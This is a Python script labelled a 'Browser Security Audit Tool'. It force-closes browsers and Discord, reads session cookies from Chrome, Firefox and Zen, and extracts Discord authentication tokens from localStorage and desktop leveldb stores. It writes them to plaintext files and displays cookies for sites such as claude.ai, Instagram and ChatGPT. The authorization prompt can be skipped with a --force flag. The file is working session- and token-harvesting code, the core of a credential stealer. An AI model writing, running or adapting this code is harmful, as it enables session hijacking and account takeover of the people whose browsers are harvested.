#!/usr/bin/env python3

import os
import sys
import sqlite3
import subprocess
import json
from datetime import datetime
from pathlib import Path

class BrowserAudit:
    COLORS = {
        'RESET': '\033[0m',
        'RED': '\033[91m',
        'GREEN': '\033[92m',
        'YELLOW': '\033[93m',
        'BLUE': '\033[94m',
        'MAGENTA': '\033[95m',
        'CYAN': '\033[96m',
    }

    def __init__(self, force_run=False, use_keychain=False):
        self.force_run = force_run
        self.use_keychain = use_keychain
        self.os_type = sys.platform
        self.home = Path.home()
        self.setup_output_dirs()

    def setup_output_dirs(self):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.audit_dir = Path(__file__).parent / "audit_output"
        self.audit_dir.mkdir(exist_ok=True)
        self.cookies_dir = self.audit_dir / f"cookies_{timestamp}"
        self.cookies_dir.mkdir(exist_ok=True)
        self.log_file = self.audit_dir / f"audit_{timestamp}.log"
        
    def log(self, level, message):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_msg = f"[{timestamp}] [{level}] {message}"
        print(log_msg)
        with open(self.log_file, 'a') as f:
            f.write(log_msg + '\n')

    def check_authorization(self):
        if self.force_run:
            return

        print(f"\n{self.COLORS['RED']}[===========================================]{self.COLORS['RESET']}")
        print(f"{self.COLORS['RED']}|  BROWSER AUDIT - RESPONSIBLE USE ONLY  |{self.COLORS['RESET']}")
        print(f"{self.COLORS['RED']}[===========================================]{self.COLORS['RESET']}\n")
        print(f"{self.COLORS['YELLOW']}This tool extracts SENSITIVE data:{self.COLORS['RESET']}")
        print(f"  - Authentication tokens")
        print(f"  - Session cookies")
        print(f"  - localStorage data")
        print(f"  - Stored credentials\n")
        print(f"{self.COLORS['YELLOW']}AUTHORIZED USE ONLY:{self.COLORS['RESET']}")
        print(f"  - Your own systems")
        print(f"  - Systems with explicit permission")
        print(f"  - Test/development environments\n")

        response = input("Do you have authorization? (y/n): ").strip().lower()
        if response != 'y':
            print(f"{self.COLORS['RED']}Audit cancelled.{self.COLORS['RESET']}")
            sys.exit(1)

    def close_browsers(self):
        import time

        browsers = ['chrome', 'firefox', 'zen', 'Discord']
        running = []

        for browser in browsers:
            try:
                result = subprocess.run(['pgrep', '-i', browser],
                                      capture_output=True)
                if result.returncode == 0:
                    running.append(browser)
            except:
                pass

        if running:
            print(f"\n{self.COLORS['YELLOW']}[!] Closing browsers: {', '.join(running)}{self.COLORS['RESET']}")
            for browser in browsers:
                try:
                    subprocess.run(['pkill', '-9', '-i', browser],
                                 capture_output=True)
                except:
                    pass
            time.sleep(1)
            print(f"{self.COLORS['GREEN']}[OK] Browsers closed{self.COLORS['RESET']}\n")
            self.log("INFO", "Browsers closed automatically")

    def extract_chrome_cookies(self):
        if self.os_type == 'darwin':
            path = self.home / "Library/Application Support/Google/Chrome/Default/Cookies"
        else:
            path = self.home / ".config/google-chrome/Default/Cookies"

        if not path.exists():
            return

        print(f"{self.COLORS['CYAN']}[*] Extracting Chrome cookies...{self.COLORS['RESET']}")
        try:
            conn = sqlite3.connect(path)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, value FROM cookies")

            with open(self.cookies_dir / "chrome_cookies.txt", 'w') as f:
                for host, name, value in cursor.fetchall():
                    f.write(f"Domain: {host}\n")
                    f.write(f"Name: {name}\n")
                    f.write(f"Value: {value}\n")
                    f.write("-" * 60 + "\n\n")

            conn.close()
            print(f"{self.COLORS['GREEN']}[OK] Chrome cookies extracted{self.COLORS['RESET']}\n")
        except Exception as e:
            self.log("ERROR", f"Chrome extraction failed: {e}")

    def extract_firefox_cookies(self):
        if self.os_type == 'darwin':
            profile_dir = self.home / "Library/Application Support/Firefox/Profiles"
        else:
            profile_dir = self.home / ".mozilla/firefox"

        if not profile_dir.exists():
            return

        print(f"{self.COLORS['CYAN']}[*] Extracting Firefox cookies...{self.COLORS['RESET']}")
        try:
            for subdir in profile_dir.glob("*default*/"):
                cookies_file = subdir / "cookies.sqlite"
                if cookies_file.exists():
                    conn = sqlite3.connect(cookies_file)
                    cursor = conn.cursor()
                    cursor.execute("SELECT host, name, value FROM moz_cookies")

                    with open(self.cookies_dir / "firefox_cookies.txt", 'w') as f:
                        for host, name, value in cursor.fetchall():
                            f.write(f"Domain: {host}\n")
                            f.write(f"Name: {name}\n")
                            f.write(f"Value: {value}\n")
                            f.write("-" * 60 + "\n\n")

                    conn.close()

            print(f"{self.COLORS['GREEN']}[OK] Firefox cookies extracted{self.COLORS['RESET']}\n")
        except Exception as e:
            self.log("ERROR", f"Firefox extraction failed: {e}")

    def extract_zen_cookies(self):
        if self.os_type == 'darwin':
            zen_dir = self.home / "Library/Application Support/zen/Profiles"
        else:
            if (self.home / ".zen").exists():
                zen_dir = self.home / ".zen"
            else:
                zen_dir = self.home / ".config/zen/Profiles"

        if not zen_dir.exists():
            return

        print(f"{self.COLORS['CYAN']}[*] Extracting Zen cookies...{self.COLORS['RESET']}")
        try:
            for profile_dir in zen_dir.glob("*/"):
                cookies_file = profile_dir / "cookies.sqlite"
                if cookies_file.exists():
                    conn = sqlite3.connect(cookies_file)
                    cursor = conn.cursor()
                    cursor.execute("SELECT host, name, value FROM moz_cookies")

                    with open(self.cookies_dir / "zen_cookies.txt", 'w') as f:
                        for host, name, value in cursor.fetchall():
                            f.write(f"Domain: {host}\n")
                            f.write(f"Name: {name}\n")
                            f.write(f"Value: {value}\n")
                            f.write("-" * 60 + "\n\n")

                    conn.close()

            print(f"{self.COLORS['GREEN']}[OK] Zen cookies extracted{self.COLORS['RESET']}\n")
        except Exception as e:
            self.log("ERROR", f"Zen extraction failed: {e}")

    def extract_discord_web_tokens(self):
        print(f"{self.COLORS['CYAN']}[*] Extracting Discord Web tokens (localStorage)...{self.COLORS['RESET']}")

        if self.os_type == 'darwin':
            firefox_profiles = self.home / "Library/Application Support/Firefox/Profiles"
            zen_profiles = self.home / "Library/Application Support/zen/Profiles"
        else:
            firefox_profiles = self.home / ".mozilla/firefox"
            zen_profiles_alt = self.home / ".zen"
            zen_profiles = self.home / ".config/zen/Profiles" if not zen_profiles_alt.exists() else zen_profiles_alt

        found_any = False

        for profile_dir in list(firefox_profiles.glob("*/")) + list(zen_profiles.glob("*/")):
            localStorage_path = profile_dir / "storage/default/https+++discord.com/ls/data.sqlite"

            if not localStorage_path.exists():
                continue

            try:
                conn = sqlite3.connect(localStorage_path)
                cursor = conn.cursor()
                cursor.execute("SELECT key, value FROM data WHERE key='token'")

                for key, value in cursor.fetchall():
                    if value and len(str(value)) > 50:
                        with open(self.cookies_dir / "discord_web_tokens.txt", 'a') as f:
                            f.write(f"[Discord Web localStorage]\n")
                            f.write(f"Key: {key}\n")
                            f.write(f"Token: {value}\n")
                            f.write("-" * 60 + "\n\n")
                        found_any = True

                conn.close()
            except Exception as e:
                self.log("DEBUG", f"Discord Web token extraction: {e}")

        if found_any:
            print(f"{self.COLORS['GREEN']}[OK] Discord Web tokens extracted{self.COLORS['RESET']}\n")

    def extract_discord_tokens(self):
        try:
            import plyvel
            import shutil
            import tempfile
        except ImportError:
            return

        print(f"{self.COLORS['CYAN']}[*] Extracting Discord Desktop tokens...{self.COLORS['RESET']}")

        if self.os_type == 'darwin':
            discord_dirs = {
                "Discord": self.home / "Library/Application Support/discord",
                "Discord Canary": self.home / "Library/Application Support/discordcanary",
                "Equicord": self.home / "Library/Application Support/Equicord"
            }
        else:
            discord_dirs = {
                "Discord": self.home / ".config/discord",
                "Discord Canary": self.home / ".config/discordcanary",
                "Equicord": self.home / ".config/Equicord"
            }

        found_any = False

        for app_name, discord_dir in discord_dirs.items():
            leveldb_path = discord_dir / "Local Storage/leveldb"

            if not leveldb_path.exists():
                continue

            try:
                with tempfile.TemporaryDirectory() as tmpdir:
                    temp_db = Path(tmpdir) / "leveldb"
                    shutil.copytree(leveldb_path, temp_db)

                    db = plyvel.DB(str(temp_db), create_if_missing=False)

                    for key, value in db.iterator():
                        key_str = key.decode('utf-8', errors='ignore')

                        if 'token' in key_str.lower() and 'discord' in key_str.lower():
                            try:
                                value_str = value.decode('utf-8', errors='ignore').strip('"')

                                if len(value_str) > 50 and any(x in value_str for x in ['MjcyMjE', 'MzA', 'NzA', 'mfa.', 'dbl_']):
                                    with open(self.cookies_dir / "discord_tokens.txt", 'a') as f:
                                        f.write(f"[{app_name}] {value_str}\n")
                                    found_any = True
                            except:
                                pass

                    db.close()
            except Exception as e:
                self.log("ERROR", f"Discord extraction failed: {e}")

        if found_any:
            print(f"{self.COLORS['GREEN']}[OK] Discord tokens extracted{self.COLORS['RESET']}\n")

    def filter_display_content(self, content, filename):
        if 'discord_tokens' in filename or 'discord_web' in filename:
            return content

        important_domains = ['claude.ai', 'discord', 'instagram', 'chatgpt']
        lines = content.split('\n')
        filtered = []
        include_block = False

        for i, line in enumerate(lines):
            if line.startswith('Domain:'):
                domain = line.split('Domain:')[1].strip().lower()
                include_block = any(d in domain for d in important_domains)

            if include_block:
                filtered.append(line)
                if i + 1 < len(lines) and lines[i + 1].strip() == '':
                    filtered.append('')
                    include_block = False

        return '\n'.join(filtered).strip()

    def display_results(self):
        print(f"\n{self.COLORS['BLUE']}{'=' * 60}{self.COLORS['RESET']}")
        print(f"{self.COLORS['BLUE']}{'EXTRACTED SENSITIVE DATA':^60}{self.COLORS['RESET']}")
        print(f"{self.COLORS['BLUE']}{'=' * 60}{self.COLORS['RESET']}\n")

        sections = [
            ("chrome_cookies.txt", "Chrome Cookies"),
            ("firefox_cookies.txt", "Firefox Cookies"),
            ("zen_cookies.txt", "Zen Cookies"),
            ("discord_web_tokens.txt", "Discord Web Tokens (localStorage)"),
            ("discord_tokens.txt", "Discord Desktop Tokens"),
        ]

        for filename, title in sections:
            filepath = self.cookies_dir / filename
            print(f"{self.COLORS['MAGENTA']}{title}:{self.COLORS['RESET']}")
            print(f"{self.COLORS['BLUE']}{'-' * 60}{self.COLORS['RESET']}")

            if filepath.exists():
                try:
                    with open(filepath, 'r') as f:
                        content = f.read().strip()
                        if content:
                            filtered = self.filter_display_content(content, filename)
                            if filtered:
                                print(f"{self.COLORS['YELLOW']}{filtered}{self.COLORS['RESET']}")
                            else:
                                print(f"{self.COLORS['CYAN']}(no data found for main domains){self.COLORS['RESET']}")
                        else:
                            print(f"{self.COLORS['CYAN']}(no data found){self.COLORS['RESET']}")
                except Exception as e:
                    print(f"{self.COLORS['RED']}Error: {e}{self.COLORS['RESET']}")
            else:
                print(f"{self.COLORS['CYAN']}(no data found){self.COLORS['RESET']}")

            print()  # Blank line between sections

    def run(self):
        print(f"\n{self.COLORS['BLUE']}[===========================================]{self.COLORS['RESET']}")
        print(f"{self.COLORS['BLUE']}    Browser Security Audit Tool{self.COLORS['RESET']}")
        print(f"{self.COLORS['BLUE']}[===========================================]{self.COLORS['RESET']}\n")

        self.check_authorization()
        self.close_browsers()

        self.log("INFO", "Audit started")

        self.extract_chrome_cookies()
        self.extract_firefox_cookies()
        self.extract_zen_cookies()
        self.extract_discord_web_tokens()
        self.extract_discord_tokens()

        self.display_results()

        print(f"\n{self.COLORS['BLUE']}[===========================================]{self.COLORS['RESET']}")
        print(f"{self.COLORS['GREEN']}Output: {self.audit_dir}{self.COLORS['RESET']}")
        print(f"{self.COLORS['BLUE']}[===========================================]{self.COLORS['RESET']}\n")

        self.log("INFO", "Audit completed successfully")

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Browser Security Audit Tool')
    parser.add_argument('--keychain', '-k', action='store_true',
                       help='Use Keychain access (macOS)')
    parser.add_argument('--force', '-f', action='store_true',
                       help='Skip authorization confirmation')
    
    args = parser.parse_args()
    
    audit = BrowserAudit(force_run=args.force, use_keychain=args.keychain)
    audit.run()

if __name__ == '__main__':
    main()

